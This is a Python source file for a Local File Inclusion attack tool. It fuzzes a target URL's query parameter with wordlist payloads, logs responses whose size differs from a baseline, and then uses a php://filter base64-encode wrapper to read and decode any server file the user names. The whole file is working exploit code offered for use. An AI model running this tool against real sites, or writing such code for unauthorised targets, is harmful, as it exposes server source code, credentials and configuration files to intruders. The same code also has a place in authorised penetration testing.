#reading.py
import aiohttp
import asyncio
from tqdm import tqdm
import aiofiles
from collections import Counter
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import base64

# Custom HTTP timeout settings
TIMEOUT = aiohttp.ClientTimeout(total=20)

# Default headers to mimic ffuf's behavior
HEADERS = {
    "User-Agent": "ffuf/v2.1.0-dev",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Accept-Encoding": "identity",  # Disable compression
}

# Allowed status codes (matching ffuf's matcher)
ALLOWED_STATUS_CODES = set(range(200, 300)) | {301, 302, 307, 401, 403, 405, 500}


def construct_url(url: str, payload: str) -> str:
    """
    Construct the fuzzed URL by replacing the value of the first GET parameter with the payload.
    If the URL has a query string, the first parameter's value is replaced.
    If there is no query string, a default parameter is appended.
    """
    parsed = urlparse(url)
    if parsed.query:
        query_dict = parse_qs(parsed.query)
        # Replace the value of the first parameter found
        key_to_replace = list(query_dict.keys())[0]
        query_dict[key_to_replace] = [payload]
        new_query = urlencode(query_dict, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)
    else:
        # No query present; append a default query parameter
        return f"{url}?FUZZ={payload}"


async def fetch(session, url):
    try:
        async with session.get(url, allow_redirects=False) as response:
            status = response.status
            response_text = await response.text()
            response_size = len(response_text)
            # aiohttp doesn't provide elapsed time by default; leaving as None
            duration = None
            location_header = response.headers.get('Location', None)
            return status, response_size, duration, location_header
    except Exception as e:
        print(f"Error fetching {url}: {e}")
        return None, None, None, None


async def calculate_baseline(url: str, wordlist: list[str], cookies: dict = None):
    """
    Calculate the baseline response size using the most frequent response size
    among the first 50 payloads.
    """
    async with aiohttp.ClientSession(headers=HEADERS, timeout=TIMEOUT, cookies=cookies) as session:
        response_sizes = []
        for payload in wordlist[:50]:
            fuzzed_url = construct_url(url, payload)
            status, response_size, _, _ = await fetch(session, fuzzed_url)
            if status in ALLOWED_STATUS_CODES and response_size is not None:
                response_sizes.append(response_size)
        if response_sizes:
            size_counts = Counter(response_sizes)
            most_common_size = size_counts.most_common(1)[0][0]
        else:
            most_common_size = None
        tqdm.write(f"[+] Baseline response size for {url}: {most_common_size}")
        return most_common_size


async def process_url_and_payload(session, url: str, payload: str, baseline_size: int, out_file, file_lock):
    """
    Process a single URL and payload combination.
    Only log and write payloads whose response size is not equal to the baseline.
    """
    fuzzed_url = construct_url(url, payload)
    status, response_size, _, _ = await fetch(session, fuzzed_url)
    if (status in ALLOWED_STATUS_CODES and
            response_size is not None and
            response_size != baseline_size):
        tqdm.write(f"{payload.ljust(60)} [Status: {status}, Size: {response_size}]")
        async with file_lock:
            await out_file.write(f"{payload}\n")


async def test_lfi(urls_file: str, wordlist_file: str, concurrency: int, cookies: dict = None):
    """
    Test for Local File Inclusion (LFI) vulnerabilities.
    Only payloads with a response size different from the baseline (most frequent)
    are logged.
    """
    # Clear the results file at the start of the script
    async with aiofiles.open('LFIVulnerable.txt', mode='w') as out_file:
        await out_file.write("")

    # Load URLs from file
    async with aiofiles.open(urls_file, mode='r') as file:
        urls = [line.strip() for line in await file.readlines() if line.strip()]

    # Load the LFI wordlist
    async with aiofiles.open(wordlist_file, mode='r') as file:
        wordlist = [line.strip() for line in await file.readlines() if line.strip()]

    for url in urls:
        print(f"\n[+] Testing LFI for URL: {url}")
        print("[+] Calculating baseline response size...")
        baseline_size = await calculate_baseline(url, wordlist, cookies)

        print("[+] Running full wordlist scan with progress bar...")
        async with aiohttp.ClientSession(headers=HEADERS, timeout=TIMEOUT, cookies=cookies) as session:
            file_lock = asyncio.Lock()
            async with aiofiles.open('LFIVulnerable.txt', mode='a') as out_file:
                tasks = [
                    asyncio.create_task(
                        process_url_and_payload(session, url, payload, baseline_size, out_file, file_lock)
                    )
                    for payload in wordlist
                ]
                for future in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Testing payloads for {url}"):
                    try:
                        await future
                    except Exception as e:
                        tqdm.write(f"[-] Error processing payload: {e}")

    print("[+] LFI testing complete.")


async def fetch_webpage_source(url: str, cookies: dict = None):
    """
    Fetch and display the raw HTML source of a webpage using the PHP filter to extract and decode Base64 content.
    """
    try:
        # Ask the user for the file they want to read
        filename = input("What file do you want to read? ")

        # Construct the URL with the PHP filter to encode the file content in Base64
        base_url = url.rsplit('=', 1)[0] + '='  # Remove the existing parameter value (e.g., include.php)
        php_filter_url = f"{base_url}php://filter/read=convert.base64-encode/resource={filename}"

        print(f"[+] Fetching Base64-encoded content from: {php_filter_url}")

        # Fetch the Base64-encoded content
        async with aiohttp.ClientSession(headers=HEADERS, timeout=TIMEOUT, cookies=cookies) as session:
            async with session.get(php_filter_url) as response:
                if response.status == 200:
                    base64_content = await response.text(errors="ignore")

                    # Decode the Base64 content
                    try:
                        decoded_content = base64.b64decode(base64_content).decode('utf-8', errors='ignore')
                        print(f"[+] Decoded source code of {filename}:\n{decoded_content}")
                    except Exception as e:
                        print(f"[-] Error decoding Base64 content: {e}")
                else:
                    print(f"[-] Failed to fetch content. HTTP Status Code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"[-] Error fetching source code for {url}: {e}")
